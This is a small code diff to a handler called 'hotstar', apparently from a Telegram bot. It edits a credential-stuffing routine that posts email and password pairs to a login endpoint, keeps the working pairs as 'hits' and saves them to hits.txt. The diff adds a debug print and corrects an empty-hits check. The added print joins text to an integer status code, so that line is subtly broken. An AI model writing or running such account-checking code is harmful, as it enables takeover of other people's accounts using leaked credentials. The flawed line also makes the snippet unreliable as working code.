@@ -43,6 +43,7 @@ async def hotstar(event):
         }
         try:
             meke = requests.post(url, data=json.dumps(payload), headers=headers)
+            print(meke.text + meke.status_code)
         except Exception as s:
             await event.edit("**Errors : **" + s)
             return
@@ -51,7 +52,7 @@ async def hotstar(event):
             hits_dict.append(f"{email}:{password}")
         else:
             bads += 1
-    if len(hits_dict) < 0:
+    if len(hits_dict) == 0:
         await event.edit("No Hits. " + meke.text)
         return
     with open("hits.txt", "w") as hitfile:
